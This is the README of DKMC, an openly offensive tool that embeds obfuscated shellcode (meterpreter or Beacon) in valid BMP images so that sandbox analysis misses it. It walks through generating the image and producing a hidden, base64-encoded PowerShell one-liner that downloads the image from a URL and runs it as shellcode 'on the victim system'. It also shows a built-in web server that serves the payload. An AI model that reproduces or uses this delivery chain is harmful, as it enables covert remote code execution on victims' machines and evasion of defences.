# Don't Kill My Cat (DKMC)
Don't kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. The idea is to avoid sandbox analysis since it's a simple "legit" image. For now the tool rely on PowerShell the execute the final shellcode payload.

Why it's called don't kill my cat? Since I suck at finding names for tools, I decided to rely on the fact that the default BMP image is a cat to name the tool. 

Presentation on how it works internally can be found here: https://github.com/Mr-Un1k0d3r/DKMC/blob/master/DKMC%20presentation%202017.pdf

# Basic Flow
* Generate shellcode (meterpreter / Beacon)
* Embed the obfuscated shellcode inside the image
* PowerShell download the image and execute the image as shellcode
* Get your shell

# Usage
Launching DKMC
```
python dkmc.py
```

Generate shellcode from a raw file
```
>>> sc
(shellcode)>>> set source shellcode.txt
        [+] source value is set.

(shellcode)>>> run
        [+] Shellcode:
\x41\x41\x41\x41
```

Generate the obfuscated shellcode embedded inside of an image.
```
>>> gen
(generate)>>> set shellcode \x41\x41\x41\x41
        [+] shellcode value is set.
        
(generate)>>> run
        [+] Image size is 300 x 275
        [+] Generating obfuscation key 0x1f1dad93
        [+] Shellcode size 0x4 (4) bytes
        [+] Generating magic bytes 0xa4d0c752
        [+] Final shellcode length is 0x57 (87) bytes
        [+] New BMP header set to 0x424de9a4c60300
        [+] New height is 0x0e010000 (270)
        [+] Successfully save the image. (/home/ringzer0/tools/DKMC/output/output-1496175261.bmp)

(generate)>>>
```

Generate PowerShell payload to execute on the victim system.
```
>>> ps
(powershell)>>> set url http://127.0.0.1:8080/output-1496175261.bmp
        [+] url value is set.

(powershell)>>> run
        [+] Powershell script:
powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBDAEYAVABUAEwAVgBrAEMALwB6AEUAMABPAFQAWQB4AE4AegBVADAATgBEAFEAdQBNAGoAVQAhAHQAVgBaAHIAYgA5AHAASQBGAFAAMABlAEsAZgA5AGgAVgBDAEgAWgBsAG8AdwBMAFMAYgBmAE4AUgBxAHAAVQBuAG4AbQAwAEUASQBKAEoAMABvAFMAaQBhAHIAIQB2AE0ARwBIAHMATQBUAE4AagBFAHIAZgBOAGYAOQA5AHIAWQB6AGQARQBrAEcAeAAyAHQAVwBzACsAWQBIAHYAdQAzAEwAbAB6AHoAcgBuAEgANAA0AEkAdQB1ADEAbwB5AFQAMwBlAEUARAA2AFIAOABDAFYASQB4AEUAWgBLADkAMwBaADMAZABuAFoASwAvAGIASAA4AEYANQBRAHMALwBjAFAAWABGAFAASQBDADcAZQBmACsAbwBkADAANAArAGsAawAvAEcANwBzADQAawBEAGoAMgBkAHgAbAA3ADIANQB2AGYAWAB2AFQAYgA1AHUAYgB0AEQAOABxAHQASABKAFEAMgBJAFcAVgBwAFMAKwBUADAAUQBmAHMAegBCAEoAdABsAEQASgBJAFUASABmAGkAegBCAGUAZwB3AHUATABTADQARwA3AGMAKwBZADEAUgB6AFcAbwBxAGcAcAAhAHMAcgBDADAAZQBGAGgASQA1AFkAUwBRAHIAMQA2AGQAbwA1ACEAMQA1AFMAQwBZAE0AdwBaAEsATgBNAGkAdgA4AGoAVgBEAEMAUwBVAHoAOABhADMANABHAG4AeQBrADUAUwArAE8AMABkAGMAagBDAG4AUAB3ADUASQBHADkAVwBhADQAbwAxAHIAbwBwADIATgBmAGgARQBmAFQAYQBoADAAMwA0AGsAeQBiAHgAcgBkAHYAaABqAFUAcwBWADAAZABPAGEAeABGAFQAcgBrAHoARABUAFoAUwBHAHcAUABFADUATgB5AHoAeQBZAEsAVQBMAEQAcABJAEkAVABLAFAARABQAEMAbQBVAG0ARwBqAG4AaQBvAFgANwBlADgANQBGAHEATwBnAEUAdQBwAGgAdABDAFIAMwBRAE0AKwBFAHIAdwAwAHIAaABLAHYAWQBqAFEAYwBjAHkAegBMAGUAVgA1AGwAbABGAG0AUQBiAGUAOQBuAEQALwBOAGQAKwBYAG8ASABDAFMAYwB4AEkAdQB4AFIAegBNAFUAaABoAHoAYgBwAE4AUAA1AGoAIQB2AG8AaAArAEgAbQBnAFcAIQA0AHgAcQBrAGkARgB5AFEAUwArAGEAQgBjAG8ANQBwADYASABQAG8AdwAyAFIAawBkAHUARwB1ADIAUAB0AHIASgA1AG4AcgBrAHoAQwBxAHAANgBWAGwASQAwAG4AYgA2AHUAeABrAHAASwAyAG0ARwB0AFoAbQBwAFcAdgBNAFcAbgBoAHQAcwBJAHUAIQBQAEsAUwBZAC8AQgBiAEoAZgBMAEgAbwBSAC8AVwBsAFkAdQBGAFIAdQBFAFUAcABqAHkAKwBLAGEANQBpAE4AIQBPADcARgA3ACEAbgBGAHMAaQBRAGYAUwBjAFUAbQBIAFMAeQBLAGEAaQBFAFQAZgBDAHcATgBaACEAegBXAGkAIQB4AFQAcQBvAGEAagBFAFMAbABCAGYAQwA0AG4AOAA2AGIAbwBkADQASwBwAGwAOQBSAG8AYgBMADgAMgBkAGIAWABJAGcAMQBuAEcANAArAG4AMAA3AFAAagBIAFkARABZAE4ARgBxADAAegBIAEIAeABlAEMAdQBhAFAASABsAE0AOQBJAGIAegBVAHYAagBtACsAZwBMAG8ATwB1AEMALwBiAFgAWAA0ADAAVABpAGMAOABMACsAVQBtAFQARgBnAEkAegBTAFMAawAhAGYATQBLAHQAWgByAGIARwBJAFUASgBoAHcAdwArAHAAdwBqAHIAWQB0ADIAbQBrAFEAKwAhADMAdwBRAE8AVQA2AHAAVABpAG0AdwB5ADMASgB6AFcAQwBwAGoAKwBQAGIAYwBlAE0AKwA2AEQAcgBIAG0AbwBDAG8AVgBWAG8AVwBDAHMAcAA4AFcAcwBXAEQAZQBOAGsANwAhAEQAIQBTAEsAOABlAGoAYQBRADMAUQBuADIAQwBCAFQAUgBlAFYAOABrAHgAZQByAHAATQB3AFkAWgBEAFUANgBWAHMAawBrAHYAeABpAGIAMQBiAE8ASQBDADUAZQBEAGIAcABCAFkAcQBsAGcALwBWAFkAaQAyAHkAVwArAE8AeAAzAEUANwBNAE4AZgBPAG8AMABrAFcANgBrAGYAVQBDAHQASABrAEoARABSAEUAcQBMAFcATQBQAGQAWQBCAHcARABOAHcASQBQAEUAWgA1AGkAbwA1AE4AagBwAGsAUAA5AGMAUgBsADAANgBJAFUAWQB5AHMAMgBEAGMAbwA1AEMANgBlAFkAYQBZAG4AYwA0AEoAcwBVAEUAMQBlAG4ANgBwAEoAWQA5AGEAYQBTAEwATQBjAEYAZgBSAEoARQBIACEASwBjAGsATABsAEoAbQA5AE0AcABlAGsAZgBlAGUAcABrADIANgBSAFIAOAA0AHgAVQA3AEsASgBwAHQAMQBWAGsAcABmACEAVgB1AGEALwBXAGoASgBsAHcAdQB0AEUAMAB1AG0AZABUAG8AVQB5AGsAVgBUADcAWAA1ADMAeABWAGEAMgBOAFoARwB2AFEAMABKAE8AYwBsAG0AMABkAGIARABlAHEATABUAGYAaQB2AEYAQwBYAEIAKwBmAG4AWQBSAFgAWQBlADMAbAAxAGUAZABtADMANgBYAHoAZwBhADMAawBVADcAZABmAEYAUABRAFgAVQAhAFQAaABYAEUARABQAFQAegBVAHEAQwBaAHgARgAzAEoAQgAvAFMAYgBWADEASAB3AHoAMAB6AG8ANgBmAFAAdQAyAHUAdgBmAEIAcQBlAEMAdgBlAG4AaABRAE8AYQBpADgARgBiAEcATwBZAGwAMgB1AHYAdgB2AHoAZgBmAFgARABIADMAdgB2AHEAOAA0ADQAaQBOADUAawA3AFYAZgA2ACsAaQBOAGEAcQBMADUAcQBpAGQAbABpAGUAagBvAC8AdgBiADYAZQB6AEQANgBQAGsANQBPAGIAdABQADMAKwB4AGgAUQA3AFYASwBvAFoANQBjAGcANABtAGwAMABoAHYATABhAFEANwBkAHkAdgBlAG8ASwBsAE0AMAB5AHoAKwBMAGoATgBRAFkAYgAhADAAZgA3AHgAIQAxAEcAdwBVAGUATgBjAGUASwBtAEYAUABqAEUAMwB0AFAARwBWAHUAWQA1AFEAZABoAGQANAB1ADcAKwAzADkAYwA0AGkAdgB3AE8AdABSADQAYwB0AFgAaAAwAGUAMwBtAEQAQgB5AE8ANQB6AEMARAB0AGYASQBKAHoAcQBtAFYAMgA1ADMANgA5AFUAMABCAFkAcgA5ACsAOABxAEMATQB2AHIATgA5ADQAUQBVAFcASQArAG0AOQA1AE8AcgBmAFoAWgBoAEYAKwBxAGkAMgBkADEAcgBSAGgAYQAwAHYANQA5ADcAZQBZADYAawBkAEQAcwA5AGkANAA3AHIAVgBiAGMAOQBPAGIALwBPAHoAMgA1AFkARwBmADQANQA3ACsAVwBuAHMAZAAzAEwANAB5ACsAaQByAEsASwAvAFQAeABzAEcANgBGAFAAWAAvAHcAagAvAHYANABOAE0AbABlAFUAYQBRAHgAMgAwAGYAYwA0AHIASAByAHoAWgBZAEIAeQBxAGEANgBkACEATABaAFMAaQBpAHEAYwA1AEYAZAA2AE4ARAB2AEQAagB1ADMAaQBTAFcARgAzAHgALwBpAFUANgB1AEIAawBRAHQAWgBRAFUAdQB3AEgAbgBzAHQAZwBRAFEANgBzADkAWgBPACEAMABsAFQAcQA4AHEAMABZADQAMgBFAHUAUwBqAC8AUQB1AEYAWQByADYAcAArADEANQAwAGUAdAB3AFQASwB1ADkAOAArAEQAZgBxAHQAdQBrAFoAUABXAFYANwBKAHQAaABEAHkAUQBNAHEASgBXAFUALwB0ADcAZQBPAHEAVAAwAHoAZwAxAFAALwBMAGMARwBmAFkAWAB1AFUATQBzAHMAdQBWACsAawBUADUANABnAEsAZQA1ADgAcQBrAFkAWgB3AFkASAArAEwARgBiAEwAeQAxAGIAYwBuAHMAaQBqAFAAOABMAHAAegBWADkAdABFAFEATAAhACEAIQA9ACIALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAgACIAQQAiACkAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA

(powershell)>>>
```

Built-in Web Server to deliver the image
```
>>> web 
(web)>>> set port 8080
        [+] port value is set.

(web)>>> run
        [+] Starting web server on port 8080

127.0.0.1 - - [30/May/2017 16:18:43] "GET /output-1496175261.bmp HTTP/1.1" 200 -
```

Final step require you to run the PowerShell oneliner on the victim system.

# TODO
Support more file format.

# Credit
Mr.Un1k0d3r RingZer0 Team 2016
